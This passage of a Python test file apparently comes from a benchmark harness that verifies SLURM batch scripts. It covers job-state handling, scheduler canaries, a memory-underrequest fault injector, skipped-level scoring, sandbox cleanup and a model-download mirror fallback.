    r = v.check_functional(GOOD, SBATCH_TASK)
    assert not r.passed and not r.skipped
    assert "still running" in r.detail


def test_a_walltime_overrun_fails_with_the_state_that_caused_it(monkeypatch):
    """The failure mode bash cannot see at all: sbatch enforces the --time the script asked
    for, so a job that overruns comes back TIMEOUT instead of finishing."""
    v = _sbatch_stub(
        monkeypatch, "done",
        [{"JobId": "42", "JobState": "TIMEOUT", "ExitCode": "0:1", "Reason": "TimeLimit"}],
        output="ANVIL_OK\n",
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert not r.passed and not r.skipped
    assert "TIMEOUT" in r.detail


def test_a_completed_job_with_the_expected_output_passes(monkeypatch):
    v = _sbatch_stub(
        monkeypatch, "done",
        [{"JobId": "42", "JobState": "COMPLETED", "ExitCode": "0:0", "Reason": "None"}],
        output="ANVIL_OK\n",
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert r.passed and not r.skipped
    assert "COMPLETED" in r.detail


def test_a_completed_job_without_the_expected_output_fails(monkeypatch):
    v = _sbatch_stub(
        monkeypatch, "done",
        [{"JobId": "42", "JobState": "COMPLETED", "ExitCode": "0:0", "Reason": "None"}],
        output="something else\n",
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert not r.passed and not r.skipped
    assert "expected output not found" in r.detail


def test_a_refused_submission_fails_the_script(monkeypatch):
    """The canary has already proved the scheduler accepts and runs a minimal script under
    this account, so a refusal here is about the script, not the harness."""
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", "sbatch")
    monkeypatch.setattr(v, "sbatch_execution_healthy", lambda force=False: (True, "ok"))
    monkeypatch.setattr(v, "_submit", lambda script, workdir: (None, "Invalid partition name"))
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert not r.passed and not r.skipped
    assert "Invalid partition name" in r.detail


def test_induce_pins_bash_whatever_the_environment_asks_for(monkeypatch, tmp_path):
    """t2_repair.jsonl is part of the benchmark definition. Inducing it under a different
    executor would silently drop the faults that executor happens to catch."""
    import anvil.verifier as v
    from anvil.cli import main

    monkeypatch.setattr(v, "_executor_override", None)
    monkeypatch.setenv("ANVIL_FUNCTIONAL_EXECUTOR", "sbatch")
    main([
        "induce", "--tasks", str(TASKS), "--reference", str(REFS),
        "--out", str(tmp_path / "t2.jsonl"),
    ])
    assert v.functional_executor() == "bash"


def test_a_skipped_functional_level_says_why_up_front(capsys, monkeypatch):
    """A whole column at 0.0 must never be left unexplained. The verbose task lines cannot
    carry it: they list the levels that failed, and a skipped one did not fail."""
    import anvil.cli as cli
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", "sbatch")
    unhealthy = (False, "no slurmd is running")
    monkeypatch.setattr(cli, "sbatch_execution_healthy", lambda force=False: unhealthy)
    monkeypatch.setattr(v, "sbatch_execution_healthy", lambda force=False: unhealthy)

    cli.main(["run", "--model", "oracle", "--tasks", str(TASKS)])
    err = capsys.readouterr().err
    assert "level 'functional' SKIPPED" in err
    assert "no slurmd is running" in err


def test_the_bash_default_never_submits_a_canary(monkeypatch):
    """The preflight costs a real job. A run that is not using the executor must not pay it."""
    import anvil.cli as cli
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", "bash")
    calls: list[int] = []

    def counted(force=False):
        calls.append(1)
        return True, "ok"

    monkeypatch.setattr(cli, "sbatch_execution_healthy", counted)
    cli.main(["run", "--model", "oracle", "--tasks", str(TASKS)])
    assert not calls


def test_the_canary_names_the_cause_the_scheduler_gave(monkeypatch):
    """A job the controller has already decided will never start is not a missing slurmd,
    and pointing at the wrong one sends the reader to the wrong fix."""
    import anvil.verifier as v

    monkeypatch.setattr(v, "_exec_health", None)
    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (True, "ok"))
    monkeypatch.setattr(v, "_submit", lambda script, workdir: ("1920", ""))
    monkeypatch.setattr(v, "_scancel", lambda job_id: None)
    monkeypatch.setattr(
        v, "_await_job",
        lambda job_id, timeout: (
            "unplaceable", [{"JobId": "1920", "JobState": "PENDING", "Reason": "InvalidAccount"}]
        ),
    )

    healthy, why = v.sbatch_execution_healthy(force=True)
    assert not healthy
    assert "InvalidAccount" in why
    assert "slurmd" not in why


# ------------------------------------------- F8 and the execution-only fault set
# The first fault class no static check and no bash run can see. It exists because
# `functional` gained an executor that enforces the allocation, and it is kept in its own
# task file so that adding it changes no digest the published numbers were measured with.
def test_f8_only_applies_where_the_spec_leaves_memory_open():
    """A task that states a minimum already covers this statically: cutting the value
    below it fails resource_fit, which is F3's and F4's job."""
    from anvil.inducer import inject_f8_memory_underrequest

    pinned = Task(id="x", prompt="p", constraints={"mem_min_mb": 512})
    assert inject_f8_memory_underrequest(GOOD, pinned) is None

    open_spec = Task(id="x", prompt="p", constraints={"nodes": 1})
    broken = inject_f8_memory_underrequest(GOOD, open_spec)
    assert broken is not None and "--mem=16M" in broken


def test_f8_is_invisible_to_every_static_level():
    """If any of these caught it, the fault would prove nothing about execution."""
    from anvil.inducer import inject_f8_memory_underrequest

    task = Task(
        id="t1_memory_bound", prompt="p", constraints={"nodes": 1, "ntasks": 1},
        required_directives=["--mem", "--time"], expects_in_body=["ANVIL_OK"],
    )
    broken = inject_f8_memory_underrequest(GOOD, task)
    assert check_syntax(broken).passed
    assert check_resource_fit(broken, task).passed
    assert check_safety(broken).passed


def test_the_execution_task_set_keeps_its_own_reference_file():
    """Folding it into tasks/t1_reference.jsonl would change the digest every published
    T1 number was measured against."""
    from anvil.models import reference_path_for

    assert reference_path_for(ROOT / "tasks" / "t1_exec.jsonl").name == "t1_exec_reference.jsonl"
    assert reference_path_for(TASKS).name == "t1_reference.jsonl"


def test_the_shared_repair_set_carries_no_execution_only_fault():
    """t2_repair.jsonl is graded under bash, where an F8 sample would pass and quietly
    weaken the no-op-repair guard."""
    import json as _json

    path = ROOT / "tasks" / "t2_repair.jsonl"
    categories = {
        _json.loads(line)["fault_category"]
        for line in path.read_text(encoding="utf-8").splitlines() if line.strip()
    }
    assert "F8" not in categories


# ------------------------------- skipped levels: whose limitation is it?
# A level nobody on this machine could check must not sink every score, or a laptop would
# report 0.0 for everything. A level that *this artifact* makes unjudgeable is the
# opposite case, and treating the two alike promoted ten broken repairs to fully correct:
# they failed under bash and passed strict under real submission, where the job they
# submit can never start.
def _levels(*results):
    from anvil.schema import VerificationResult

    res = VerificationResult(task_id="t", script=GOOD)
    res.levels.extend(results)
    return res


def test_a_level_no_machine_here_could_check_does_not_sink_the_artifact():
    from anvil.schema import LevelResult

    res = _levels(
        LevelResult(Level.SYNTAX, True),
        LevelResult(Level.SUBMITTABILITY, False, skipped=True),   # no scheduler here
    )
    assert res.all_passed


def test_a_level_this_artifact_makes_unjudgeable_does_sink_it():
    from anvil.schema import LevelResult

    res = _levels(
        LevelResult(Level.SYNTAX, True),
        LevelResult(Level.FUNCTIONAL, False, skipped=True, skip_scope="artifact"),
    )
    assert not res.all_passed


def test_an_unplaceable_job_is_charged_to_the_artifact(monkeypatch):
    """The measured case: a repair whose job can never start used to pass strict."""
    v = _sbatch_stub(
        monkeypatch, "unplaceable",
        [{"JobId": "42", "JobState": "PENDING", "Reason": "DependencyNeverSatisfied"}],
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert r.skipped and r.skip_scope == "artifact"

    res = _levels(v.check_syntax(GOOD), r)
    assert not res.all_passed, "an unjudgeable job must not certify the artifact"


def test_strict_reports_how_many_samples_rest_on_a_skip():
    """The count beside strict was hardcoded to zero, which hid the whole phenomenon."""
    from anvil.metrics import aggregate
    from anvil.schema import LevelResult

    resting = _levels(
        LevelResult(Level.SYNTAX, True),
        LevelResult(Level.SUBMITTABILITY, False, skipped=True),
    )
    clean = _levels(LevelResult(Level.SYNTAX, True), LevelResult(Level.SUBMITTABILITY, True))
    summary = aggregate([resting, clean], k=1)
    assert summary["strict_all_levels"]["n_skipped_samples"] == 1


# ------------------------------- the second canary: is this the declared cluster?
# The first canary asks whether the scheduler works, and every working SLURM says yes. A
# whole multi-seed table was measured against a one-node scheduler with no GPUs that
# answered yes: it refused three of the eight canonical solutions, and on it a script that
# forgets `--gpus` outscored one that asks for it.
def test_the_topology_canary_asks_for_what_the_topology_promises(monkeypatch):
    import anvil.verifier as v

    monkeypatch.setenv("ANVIL_NODES", "4")
    monkeypatch.setenv("ANVIL_GPUS", "4")
    script, asked = v._topology_canary()
    assert "#SBATCH --nodes=4" in script
    assert "#SBATCH --gres=gpu:1" in script
    assert "4 nodes" in asked and "GPU" in asked


def test_a_gpuless_topology_does_not_ask_for_a_gpu(monkeypatch):
    """Declaring ANVIL_GPUS=0 is a legitimate topology, and the canary must match it."""
    import anvil.verifier as v

    monkeypatch.setenv("ANVIL_NODES", "2")
    monkeypatch.setenv("ANVIL_GPUS", "0")
    script, asked = v._topology_canary()
    assert "--gpus" not in script and "GPU" not in asked
    assert "#SBATCH --nodes=2" in script


def test_a_working_scheduler_that_is_not_the_declared_cluster_skips_the_level(monkeypatch):
    """The measured case: submittability must be skipped, not scored, on such a machine."""
    import anvil.verifier as v

    calls = []

    class R:
        def __init__(self, code, err=""):
            self.returncode, self.stderr, self.stdout = code, err, ""

    def fake_run(cmd, **kw):
        calls.append(cmd)
        # the minimal canary passes, the topology one is refused
        return R(0) if len(calls) == 1 else R(1, "Requested node configuration is not available")

    monkeypatch.setattr(v, "_health", None)
    monkeypatch.setattr(v.shutil, "which", lambda _: "/usr/bin/sbatch")
    monkeypatch.setattr(v.subprocess, "run", fake_run)

    healthy, why = v.slurm_healthy(force=True)
    assert not healthy
    assert "not the declared reference cluster" in why

    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (healthy, why))
    r = v.check_submittability(GOOD)
    assert r.skipped and not r.passed


def test_the_bash_sandbox_does_not_outlive_the_sample(monkeypatch):
    """One directory per verified sample is invisible while developing and not while
    measuring: an ablation verifies 1560 samples twice, and a development machine had ten
    thousand of them before this was noticed."""
    import anvil.verifier as v

    created: list[str] = []
    real_mkdtemp = v.tempfile.mkdtemp

    def recording(*args, **kwargs):
        path = real_mkdtemp(*args, **kwargs)
        created.append(path)
        return path

    monkeypatch.setattr(v.tempfile, "mkdtemp", recording)
    monkeypatch.setattr(v, "_executor_override", "bash")

    v.check_functional(GOOD, SBATCH_TASK)
    assert created, "the bash executor no longer makes a sandbox: this test is watching nothing"
    assert not [d for d in created if Path(d).exists()]


# ------------------------------- where the weights came from
def test_a_failed_download_retries_against_a_declared_mirror(monkeypatch):
    from anvil.models import _load_with_fallback

    monkeypatch.setenv("ANVIL_HF_ENDPOINT", "https://mirror.example")
    monkeypatch.delenv("HF_ENDPOINT", raising=False)
    attempts = []

    def load():
        import os

        attempts.append(os.environ.get("HF_ENDPOINT"))
        if len(attempts) == 1:
            raise OSError("429 Too Many Requests")
        return "tok", "model"

    tok, model, endpoint = _load_with_fallback(load)
    assert (tok, model) == ("tok", "model")
    assert endpoint == "https://mirror.example"
    assert attempts == [None, "https://mirror.example"]
    import os

    assert "HF_ENDPOINT" not in os.environ, "the redirect must not outlive the load"


def test_without_a_declared_mirror_the_failure_is_the_answer(monkeypatch):
    """Silently carrying on would leave a cell missing for a reason nobody recorded."""
    from anvil.models import _load_with_fallback

    monkeypatch.delenv("ANVIL_HF_ENDPOINT", raising=False)

    def load():
        raise OSError("429 Too Many Requests")

    with pytest.raises(OSError, match="429"):
        _load_with_fallback(load)


def test_a_successful_load_reports_the_default_endpoint(monkeypatch):
    from anvil.models import DEFAULT_HF_ENDPOINT, _load_with_fallback

    monkeypatch.delenv("HF_ENDPOINT", raising=False)
    _, _, endpoint = _load_with_fallback(lambda: ("tok", "model"))
    assert endpoint == DEFAULT_HF_ENDPOINT
